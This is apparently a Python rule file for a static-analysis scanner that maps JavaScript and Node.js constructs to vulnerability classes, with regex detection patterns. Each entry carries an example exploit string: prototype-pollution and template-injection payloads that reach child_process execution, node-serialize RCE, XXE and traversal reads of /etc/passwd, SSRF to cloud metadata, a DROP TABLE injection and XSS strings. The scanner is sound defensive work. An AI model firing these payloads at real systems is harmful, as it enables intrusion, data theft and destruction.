"""
JavaScript/TypeScript SAST Patterns - Complete Magic Methods and Exploitation Patterns
"""

# ============================================================================
# JAVASCRIPT MAGIC METHODS & SPECIAL PROPERTIES
# ============================================================================
JAVASCRIPT_MAGIC_METHODS = {
    'name': 'JavaScript Magic Methods & Prototype Chain',
    'description': 'All JavaScript special methods and prototype chain exploitation',
    'methods': {
        # OBJECT FUNDAMENTALS
        '__proto__': {
            'trigger': 'Prototype chain access',
            'exploit_scenarios': [
                'PROTOTYPE POLLUTION - Most critical JS vulnerability',
                'Pollute Object.prototype to affect all objects',
                'RCE via child_process spawn options',
            ],
            'dangerous_with': ['merge', 'extend', 'deepCopy', 'assign'],
        },
        'prototype': {
            'trigger': 'Constructor prototype access',
            'exploit_scenarios': [
                'Prototype pollution via constructor.prototype',
                'Method override attacks',
            ],
            'dangerous_with': ['Object.assign', 'jQuery.extend'],
        },
        'constructor': {
            'trigger': 'Object constructor reference',
            'exploit_scenarios': [
                'Access to Function constructor',
                'constructor.constructor("return this")() for global',
                'Sandbox escape',
            ],
            'dangerous_with': [],
        },
        
        # PROPERTY DESCRIPTORS
        '__defineGetter__': {
            'trigger': 'Legacy getter definition',
            'exploit_scenarios': [
                'Define malicious getters',
                'Property access hooks',
            ],
            'dangerous_with': [],
        },
        '__defineSetter__': {
            'trigger': 'Legacy setter definition',
            'exploit_scenarios': [
                'Define malicious setters',
                'Property write hooks',
            ],
            'dangerous_with': [],
        },
        '__lookupGetter__': {
            'trigger': 'Legacy getter lookup',
            'exploit_scenarios': [
                'Getter inspection for exploitation',
            ],
            'dangerous_with': [],
        },
        '__lookupSetter__': {
            'trigger': 'Legacy setter lookup',
            'exploit_scenarios': [
                'Setter inspection for exploitation',
            ],
            'dangerous_with': [],
        },
        
        # SYMBOLS (ES6)
        'Symbol.iterator': {
            'trigger': 'for...of iteration',
            'exploit_scenarios': [
                'Custom iteration behavior',
                'Infinite loop DoS',
            ],
            'dangerous_with': [],
        },
        'Symbol.toStringTag': {
            'trigger': 'Object.prototype.toString',
            'exploit_scenarios': [
                'Type check bypass',
            ],
            'dangerous_with': [],
        },
        'Symbol.toPrimitive': {
            'trigger': 'Type coercion',
            'exploit_scenarios': [
                'Type coercion manipulation',
            ],
            'dangerous_with': [],
        },
        'Symbol.hasInstance': {
            'trigger': 'instanceof check',
            'exploit_scenarios': [
                'instanceof bypass',
            ],
            'dangerous_with': [],
        },
        'Symbol.species': {
            'trigger': 'Derived object creation',
            'exploit_scenarios': [
                'Array/Promise species manipulation',
            ],
            'dangerous_with': [],
        },
        
        # OBJECT METHODS
        'toString': {
            'trigger': 'String coercion',
            'exploit_scenarios': [
                'Type coercion attacks',
                'Bypass string checks',
            ],
            'dangerous_with': [],
        },
        'valueOf': {
            'trigger': 'Primitive value coercion',
            'exploit_scenarios': [
                'Numeric coercion manipulation',
            ],
            'dangerous_with': [],
        },
        'toJSON': {
            'trigger': 'JSON.stringify()',
            'exploit_scenarios': [
                'JSON serialization manipulation',
                'Data exfiltration',
            ],
            'dangerous_with': [],
        },
        
        # PROXY TRAPS (ES6)
        'get': {
            'trigger': 'Property access',
            'exploit_scenarios': [
                'Property access interception',
                'Logging/exfiltration',
            ],
            'dangerous_with': [],
        },
        'set': {
            'trigger': 'Property assignment',
            'exploit_scenarios': [
                'Property write interception',
            ],
            'dangerous_with': [],
        },
        'has': {
            'trigger': 'in operator',
            'exploit_scenarios': [
                'Property check manipulation',
            ],
            'dangerous_with': [],
        },
        'deleteProperty': {
            'trigger': 'delete operator',
            'exploit_scenarios': [
                'Property deletion interception',
            ],
            'dangerous_with': [],
        },
        'apply': {
            'trigger': 'Function call',
            'exploit_scenarios': [
                'Function call interception',
                'Argument manipulation',
            ],
            'dangerous_with': [],
        },
        'construct': {
            'trigger': 'new operator',
            'exploit_scenarios': [
                'Constructor call interception',
            ],
            'dangerous_with': [],
        },
        'getPrototypeOf': {
            'trigger': 'Object.getPrototypeOf()',
            'exploit_scenarios': [
                'Prototype chain manipulation',
            ],
            'dangerous_with': [],
        },
        'setPrototypeOf': {
            'trigger': 'Object.setPrototypeOf()',
            'exploit_scenarios': [
                'Prototype chain modification',
            ],
            'dangerous_with': [],
        },
        'defineProperty': {
            'trigger': 'Object.defineProperty()',
            'exploit_scenarios': [
                'Property descriptor manipulation',
            ],
            'dangerous_with': [],
        },
        'getOwnPropertyDescriptor': {
            'trigger': 'Descriptor retrieval',
            'exploit_scenarios': [
                'Property descriptor inspection',
            ],
            'dangerous_with': [],
        },
        'ownKeys': {
            'trigger': 'Key enumeration',
            'exploit_scenarios': [
                'Hide/reveal properties',
            ],
            'dangerous_with': [],
        },
        'isExtensible': {
            'trigger': 'Object.isExtensible()',
            'exploit_scenarios': [
                'Extensibility check bypass',
            ],
            'dangerous_with': [],
        },
        'preventExtensions': {
            'trigger': 'Object.preventExtensions()',
            'exploit_scenarios': [
                'Freeze/seal bypass',
            ],
            'dangerous_with': [],
        },
        
        # FUNCTION PROPERTIES
        'call': {
            'trigger': 'Function.prototype.call()',
            'exploit_scenarios': [
                'Context manipulation',
                'this binding attacks',
            ],
            'dangerous_with': [],
        },
        'apply': {
            'trigger': 'Function.prototype.apply()',
            'exploit_scenarios': [
                'Arguments array injection',
            ],
            'dangerous_with': [],
        },
        'bind': {
            'trigger': 'Function.prototype.bind()',
            'exploit_scenarios': [
                'Permanent this binding',
            ],
            'dangerous_with': [],
        },
        'arguments': {
            'trigger': 'Function arguments object',
            'exploit_scenarios': [
                'Argument inspection',
                'arguments.callee (deprecated)',
            ],
            'dangerous_with': [],
        },
        'caller': {
            'trigger': 'Function caller (deprecated)',
            'exploit_scenarios': [
                'Call stack inspection',
            ],
            'dangerous_with': [],
        },
        
        # ARRAY METHODS THAT CAN BE EXPLOITED
        'length': {
            'trigger': 'Array/string length',
            'exploit_scenarios': [
                'Length manipulation via prototype pollution',
                'DoS via large length',
            ],
            'dangerous_with': [],
        },
        
        # NODE.JS SPECIFIC
        '__filename': {
            'trigger': 'Node.js module filename',
            'exploit_scenarios': [
                'Path disclosure',
            ],
            'dangerous_with': [],
        },
        '__dirname': {
            'trigger': 'Node.js module directory',
            'exploit_scenarios': [
                'Path disclosure',
            ],
            'dangerous_with': [],
        },
        'process': {
            'trigger': 'Node.js process object',
            'exploit_scenarios': [
                'Environment variable access',
                'process.mainModule.require() for RCE',
            ],
            'dangerous_with': ['require', 'mainModule'],
        },
        'global': {
            'trigger': 'Node.js global object',
            'exploit_scenarios': [
                'Global namespace access',
                'Sandbox escape',
            ],
            'dangerous_with': [],
        },
        'globalThis': {
            'trigger': 'ES2020 global',
            'exploit_scenarios': [
                'Cross-environment global access',
            ],
            'dangerous_with': [],
        },
        'require': {
            'trigger': 'Node.js module loading',
            'exploit_scenarios': [
                'CRITICAL: Module loading RCE',
                'require("child_process").exec()',
            ],
            'dangerous_with': ['child_process', 'fs', 'vm'],
        },
        'module': {
            'trigger': 'Node.js module object',
            'exploit_scenarios': [
                'Module system manipulation',
                'module.require() access',
            ],
            'dangerous_with': [],
        },
        
        # BROWSER DOM
        'innerHTML': {
            'trigger': 'DOM innerHTML assignment',
            'exploit_scenarios': [
                'DOM XSS',
                'Script injection',
            ],
            'dangerous_with': [],
        },
        'outerHTML': {
            'trigger': 'DOM outerHTML assignment',
            'exploit_scenarios': [
                'DOM XSS',
            ],
            'dangerous_with': [],
        },
        'document': {
            'trigger': 'Document object',
            'exploit_scenarios': [
                'DOM manipulation',
                'Cookie access',
            ],
            'dangerous_with': [],
        },
        'window': {
            'trigger': 'Window object',
            'exploit_scenarios': [
                'Global access',
                'Location manipulation',
            ],
            'dangerous_with': [],
        },
    },
    
    # PROTOTYPE POLLUTION GADGETS
    'prototype_pollution_gadgets': {
        'shell_spawn': {
            'description': 'RCE via child_process.spawn options',
            'payload': '{"__proto__": {"shell": true, "argv0": "node", "env": {"NODE_OPTIONS": "--require=/proc/self/cmdline"}}}',
        },
        'ejs_rce': {
            'description': 'RCE via EJS template engine',
            'payload': '{"__proto__": {"outputFunctionName": "x;process.mainModule.require(\'child_process\').exec(\'id\');x"}}',
        },
        'pug_rce': {
            'description': 'RCE via Pug template engine',
            'payload': '{"__proto__": {"block": {"type": "Text", "val": "x]});process.mainModule.require(\'child_process\').exec(\'id\');//"}}}',
        },
        'handlebars_rce': {
            'description': 'RCE via Handlebars',
            'payload': '{"__proto__": {"allowedProtoMethods": {"*": true}}}',
        },
        'lodash_rce': {
            'description': 'RCE via Lodash template',
            'payload': '{"__proto__": {"sourceURL": "\\nreturn process.mainModule.require(\'child_process\').execSync(\'id\')//\n"}}',
        },
    },
    
    # DOM CLOBBERING
    'dom_clobbering': {
        'description': 'Override global variables via DOM elements',
        'examples': [
            '<img name="x"><img name="x" id="y">  // Creates window.x.y',
            '<form id="location"><input name="href" value="javascript:alert(1)">',
        ],
    },
}

# ============================================================================
# JAVASCRIPT VULNERABILITY PATTERNS
# ============================================================================
JAVASCRIPT_PATTERNS = [
    # ----- PROTOTYPE POLLUTION -----
    {
        'id': 'js_proto_pollution_merge',
        'name': 'JavaScript Prototype Pollution (merge)',
        'category': 'prototype_pollution',
        'severity': 'critical',
        'pattern': r'(merge|extend|deepExtend|defaultsDeep|assign|jQuery\.extend)\s*\([^)]*(?:req\.|request\.|body|query|params)',
        'description': 'Prototype pollution via merge operations',
        'exploit': '{"__proto__": {"admin": true}}',
        'cwe': 'CWE-1321',
    },
    {
        'id': 'js_proto_pollution_bracket',
        'name': 'JavaScript Prototype Pollution (bracket notation)',
        'category': 'prototype_pollution',
        'severity': 'critical',
        'pattern': r'\[[^\]]*\]\s*=\s*[^;]*(?:req\.|request\.|body|query|params)',
        'description': 'Prototype pollution via bracket notation',
        'exploit': 'obj[user_input] = value',
        'cwe': 'CWE-1321',
    },
    {
        'id': 'js_proto_pollution_path',
        'name': 'JavaScript Prototype Pollution (path set)',
        'category': 'prototype_pollution',
        'severity': 'critical',
        'pattern': r'(set|setIn|setPath|lodash\.set|_.set)\s*\([^)]*(?:req\.|request\.|body|query|params)',
        'description': 'Prototype pollution via path-based set',
        'exploit': '__proto__.admin',
        'cwe': 'CWE-1321',
    },
    
    # ----- COMMAND INJECTION -----
    {
        'id': 'js_cmdi_exec',
        'name': 'Node.js exec() Command Injection',
        'category': 'command_injection',
        'severity': 'critical',
        'pattern': r'child_process\.exec\s*\([^)]*(?:req\.|request\.|body|query|params|\+)',
        'description': 'Command injection via child_process.exec()',
        'exploit': '; id #',
        'cwe': 'CWE-78',
    },
    {
        'id': 'js_cmdi_execSync',
        'name': 'Node.js execSync() Command Injection',
        'category': 'command_injection',
        'severity': 'critical',
        'pattern': r'child_process\.execSync\s*\([^)]*(?:req\.|request\.|body|query|params|\+)',
        'description': 'Command injection via child_process.execSync()',
        'exploit': '`id`',
        'cwe': 'CWE-78',
    },
    {
        'id': 'js_cmdi_spawn_shell',
        'name': 'Node.js spawn() with shell',
        'category': 'command_injection',
        'severity': 'critical',
        'pattern': r'spawn\s*\([^)]*{[^}]*shell\s*:\s*true',
        'description': 'Command injection via spawn with shell option',
        'exploit': '; id',
        'cwe': 'CWE-78',
    },
    {
        'id': 'js_cmdi_shelljs',
        'name': 'ShellJS Command Injection',
        'category': 'command_injection',
        'severity': 'critical',
        'pattern': r'shell\.(exec|ShellString)\s*\([^)]*(?:req\.|request\.|body|query)',
        'description': 'Command injection via ShellJS',
        'exploit': '; whoami',
        'cwe': 'CWE-78',
    },
    
    # ----- CODE EXECUTION -----
    {
        'id': 'js_rce_eval',
        'name': 'JavaScript eval() RCE',
        'category': 'rce',
        'severity': 'critical',
        'pattern': r'eval\s*\([^)]*(?:req\.|request\.|body|query|params|user)',
        'description': 'Code execution via eval()',
        'exploit': 'require("child_process").exec("id")',
        'cwe': 'CWE-94',
    },
    {
        'id': 'js_rce_function_constructor',
        'name': 'JavaScript Function() Constructor',
        'category': 'rce',
        'severity': 'critical',
        'pattern': r'(new\s+)?Function\s*\([^)]*(?:req\.|request\.|body|query|params)',
        'description': 'Code execution via Function constructor',
        'exploit': 'new Function("return process.mainModule.require(\'child_process\').execSync(\'id\').toString()")()',
        'cwe': 'CWE-94',
    },
    {
        'id': 'js_rce_settimeout_string',
        'name': 'JavaScript setTimeout/setInterval with String',
        'category': 'rce',
        'severity': 'critical',
        'pattern': r'(setTimeout|setInterval)\s*\([^)]*(?:req\.|request\.|body|query)[^)]*\)',
        'description': 'Code execution via setTimeout/setInterval with string',
        'exploit': 'setTimeout(userInput, 1000)',
        'cwe': 'CWE-94',
    },
    {
        'id': 'js_rce_vm_runInContext',
        'name': 'Node.js vm RCE',
        'category': 'rce',
        'severity': 'critical',
        'pattern': r'vm\.(runIn|createContext|compileFunction)\s*\([^)]*(?:req\.|request\.|body|query)',
        'description': 'Code execution via vm module',
        'exploit': 'vm sandbox escape via this.constructor',
        'cwe': 'CWE-94',
    },
    {
        'id': 'js_rce_unserialize',
        'name': 'Node.js node-serialize RCE',
        'category': 'rce',
        'severity': 'critical',
        'pattern': r'(serialize|unserialize)\.unserialize\s*\(',
        'description': 'RCE via node-serialize deserialization',
        'exploit': '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'id\')}()"}',
        'cwe': 'CWE-502',
    },
    
    # ----- SQL INJECTION -----
    {
        'id': 'js_sqli_template_literal',
        'name': 'JavaScript SQL Injection (Template Literal)',
        'category': 'sqli',
        'severity': 'high',
        'pattern': r'(query|execute)\s*\(`[^`]*\$\{',
        'description': 'SQL injection via template literals',
        'exploit': '\'; DROP TABLE users;--',
        'cwe': 'CWE-89',
    },
    {
        'id': 'js_sqli_concat',
        'name': 'JavaScript SQL Injection (Concatenation)',
        'category': 'sqli',
        'severity': 'high',
        'pattern': r'(query|execute)\s*\([^)]*\+[^)]*(?:req\.|request\.|body|query)',
        'description': 'SQL injection via string concatenation',
        'exploit': '\' OR 1=1--',
        'cwe': 'CWE-89',
    },
    {
        'id': 'js_sqli_knex_raw',
        'name': 'Knex.js Raw Query Injection',
        'category': 'sqli',
        'severity': 'high',
        'pattern': r'\.raw\s*\([^)]*(?:req\.|request\.|body|query)',
        'description': 'SQL injection via Knex.js raw()',
        'exploit': 'Same as generic SQLi',
        'cwe': 'CWE-89',
    },
    {
        'id': 'js_nosql_injection',
        'name': 'NoSQL Injection (MongoDB)',
        'category': 'nosqli',
        'severity': 'high',
        'pattern': r'\.(find|findOne|update|delete|aggregate)\s*\([^)]*(?:req\.|request\.|body|query)',
        'description': 'NoSQL injection in MongoDB',
        'exploit': '{"$gt": ""}',
        'cwe': 'CWE-943',
    },
    
    # ----- XSS -----
    {
        'id': 'js_xss_innerhtml',
        'name': 'JavaScript DOM XSS (innerHTML)',
        'category': 'xss',
        'severity': 'high',
        'pattern': r'\.innerHTML\s*=\s*[^;]*(?:req\.|request\.|location|document\.URL|document\.referrer)',
        'description': 'DOM XSS via innerHTML',
        'exploit': '<img src=x onerror=alert(1)>',
        'cwe': 'CWE-79',
    },
    {
        'id': 'js_xss_document_write',
        'name': 'JavaScript DOM XSS (document.write)',
        'category': 'xss',
        'severity': 'high',
        'pattern': r'document\.write(ln)?\s*\([^)]*(?:location|URL|referrer)',
        'description': 'DOM XSS via document.write()',
        'exploit': '<script>alert(1)</script>',
        'cwe': 'CWE-79',
    },
    {
        'id': 'js_xss_jquery_html',
        'name': 'JavaScript DOM XSS (jQuery.html)',
        'category': 'xss',
        'severity': 'high',
        'pattern': r'\$\([^)]+\)\.(html|append|prepend|after|before)\s*\([^)]*(?:req\.|request\.|location)',
        'description': 'DOM XSS via jQuery DOM manipulation',
        'exploit': '<img src=x onerror=alert(1)>',
        'cwe': 'CWE-79',
    },
    
    # ----- PATH TRAVERSAL -----
    {
        'id': 'js_path_traversal_readFile',
        'name': 'Node.js Path Traversal (readFile)',
        'category': 'path_traversal',
        'severity': 'high',
        'pattern': r'fs\.(readFile|readFileSync|createReadStream)\s*\([^)]*(?:req\.|request\.|body|query)',
        'description': 'Path traversal via fs.readFile()',
        'exploit': '../../../etc/passwd',
        'cwe': 'CWE-22',
    },
    {
        'id': 'js_path_traversal_sendFile',
        'name': 'Express Path Traversal (sendFile)',
        'category': 'path_traversal',
        'severity': 'high',
        'pattern': r'(sendFile|download)\s*\([^)]*(?:req\.|request\.|body|query)',
        'description': 'Path traversal via Express sendFile()',
        'exploit': '../../../etc/passwd',
        'cwe': 'CWE-22',
    },
    
    # ----- SSRF -----
    {
        'id': 'js_ssrf_axios',
        'name': 'Node.js SSRF (axios)',
        'category': 'ssrf',
        'severity': 'high',
        'pattern': r'axios\.(get|post|put|delete|patch)\s*\([^)]*(?:req\.|request\.|body|query)',
        'description': 'SSRF via axios',
        'exploit': 'http://169.254.169.254/latest/meta-data/',
        'cwe': 'CWE-918',
    },
    {
        'id': 'js_ssrf_fetch',
        'name': 'Node.js SSRF (fetch)',
        'category': 'ssrf',
        'severity': 'high',
        'pattern': r'fetch\s*\([^)]*(?:req\.|request\.|body|query)',
        'description': 'SSRF via fetch()',
        'exploit': 'http://localhost:6379/',
        'cwe': 'CWE-918',
    },
    {
        'id': 'js_ssrf_request',
        'name': 'Node.js SSRF (request)',
        'category': 'ssrf',
        'severity': 'high',
        'pattern': r'request\s*\([^)]*(?:req\.|request\.|body|query)',
        'description': 'SSRF via request library',
        'exploit': 'file:///etc/passwd',
        'cwe': 'CWE-918',
    },
    
    # ----- XXE -----
    {
        'id': 'js_xxe_xml2js',
        'name': 'Node.js XXE (xml2js)',
        'category': 'xxe',
        'severity': 'high',
        'pattern': r'xml2js\.parseString\s*\([^)]*(?:req\.|request\.|body)',
        'description': 'XXE via xml2js',
        'exploit': '<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
        'cwe': 'CWE-611',
    },
    {
        'id': 'js_xxe_libxmljs',
        'name': 'Node.js XXE (libxmljs)',
        'category': 'xxe',
        'severity': 'high',
        'pattern': r'libxmljs\.parseXml\s*\([^)]*{[^}]*noent\s*:\s*true',
        'description': 'XXE via libxmljs with noent:true',
        'exploit': 'Same XXE payload',
        'cwe': 'CWE-611',
    },
    
    # ----- SSTI -----
    {
        'id': 'js_ssti_pug',
        'name': 'Node.js SSTI (Pug/Jade)',
        'category': 'ssti',
        'severity': 'critical',
        'pattern': r'pug\.(compile|render)\s*\([^)]*(?:req\.|request\.|body|query)',
        'description': 'SSTI via Pug template',
        'exploit': '#{global.process.mainModule.require(\'child_process\').execSync(\'id\')}',
        'cwe': 'CWE-94',
    },
    {
        'id': 'js_ssti_ejs',
        'name': 'Node.js SSTI (EJS)',
        'category': 'ssti',
        'severity': 'critical',
        'pattern': r'ejs\.(compile|render)\s*\([^)]*(?:req\.|request\.|body|query)',
        'description': 'SSTI via EJS template',
        'exploit': '<%= global.process.mainModule.require(\'child_process\').execSync(\'id\') %>',
        'cwe': 'CWE-94',
    },
    {
        'id': 'js_ssti_nunjucks',
        'name': 'Node.js SSTI (Nunjucks)',
        'category': 'ssti',
        'severity': 'critical',
        'pattern': r'nunjucks\.(compile|render)\s*\([^)]*(?:req\.|request\.|body|query)',
        'description': 'SSTI via Nunjucks template',
        'exploit': '{{range.constructor("return global.process.mainModule.require(\'child_process\').execSync(\'id\')")()}}',
        'cwe': 'CWE-94',
    },
    {
        'id': 'js_ssti_handlebars',
        'name': 'Node.js SSTI (Handlebars)',
        'category': 'ssti',
        'severity': 'critical',
        'pattern': r'Handlebars\.(compile|registerHelper)\s*\([^)]*(?:req\.|request\.|body)',
        'description': 'SSTI via Handlebars',
        'exploit': '{{#with "s" as |string|}}{{#with split as |conslist|}}...',
        'cwe': 'CWE-94',
    },
    
    # ----- DESERIALIZATION -----
    {
        'id': 'js_deser_json_parse',
        'name': 'JavaScript Insecure JSON Parse with Reviver',
        'category': 'deserialization',
        'severity': 'high',
        'pattern': r'JSON\.parse\s*\([^,]+,\s*function',
        'description': 'Potentially dangerous JSON reviver function',
        'exploit': 'Reviver function can execute code',
        'cwe': 'CWE-502',
    },
    
    # ----- REGEX DOS -----
    {
        'id': 'js_redos',
        'name': 'JavaScript ReDoS',
        'category': 'dos',
        'severity': 'medium',
        'pattern': r'new\s+RegExp\s*\([^)]*(?:req\.|request\.|body|query)',
        'description': 'ReDoS via dynamic regex',
        'exploit': '(a+)+$ with "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!"',
        'cwe': 'CWE-1333',
    },
    
    # ----- OPEN REDIRECT -----
    {
        'id': 'js_open_redirect',
        'name': 'JavaScript Open Redirect',
        'category': 'open_redirect',
        'severity': 'medium',
        'pattern': r'(res\.redirect|window\.location|location\.href)\s*[=\(][^;]*(?:req\.|request\.|query)',
        'description': 'Open redirect vulnerability',
        'exploit': '//evil.com',
        'cwe': 'CWE-601',
    },
    
    # ----- HARDCODED SECRETS -----
    {
        'id': 'js_secrets',
        'name': 'JavaScript Hardcoded Secrets',
        'category': 'secrets',
        'severity': 'high',
        'pattern': r'(API_KEY|SECRET|PASSWORD|TOKEN|PRIVATE_KEY)\s*[:=]\s*[\'"][^\'"]{10,}[\'"]',
        'description': 'Hardcoded secrets in code',
        'exploit': 'Credential theft',
        'cwe': 'CWE-798',
    },
    
    # ----- JWT ISSUES -----
    {
        'id': 'js_jwt_none_alg',
        'name': 'JWT Algorithm None Attack',
        'category': 'auth_bypass',
        'severity': 'critical',
        'pattern': r'jwt\.(verify|decode)\s*\([^)]*algorithms\s*:\s*\[[^\]]*[\'"]none[\'"]',
        'description': 'JWT accepts none algorithm',
        'exploit': 'Set alg: "none" and remove signature',
        'cwe': 'CWE-327',
    },
    {
        'id': 'js_jwt_weak_secret',
        'name': 'JWT Weak Secret',
        'category': 'crypto',
        'severity': 'high',
        'pattern': r'jwt\.sign\s*\([^)]*[\'"][^\'"]{0,20}[\'"]',
        'description': 'JWT with weak/short secret',
        'exploit': 'Brute-force secret',
        'cwe': 'CWE-326',
    },
    
    # ----- INFORMATION DISCLOSURE -----
    {
        'id': 'js_stack_trace_disclosure',
        'name': 'Stack Trace Disclosure',
        'category': 'info_disclosure',
        'severity': 'medium',
        'pattern': r'(console\.log|res\.(send|json))\s*\([^)]*err(or)?\.stack',
        'description': 'Stack trace disclosure',
        'exploit': 'Path disclosure',
        'cwe': 'CWE-209',
    },
    
    # ----- EXPRESS SPECIFIC -----
    {
        'id': 'js_express_csrf',
        'name': 'Express Missing CSRF Protection',
        'category': 'csrf',
        'severity': 'medium',
        'pattern': r'app\.(post|put|delete|patch)\s*\([^)]+\)\s*[^{]*{(?!.*csrf)',
        'description': 'POST route without CSRF protection',
        'exploit': 'Cross-site request forgery',
        'cwe': 'CWE-352',
    },
]
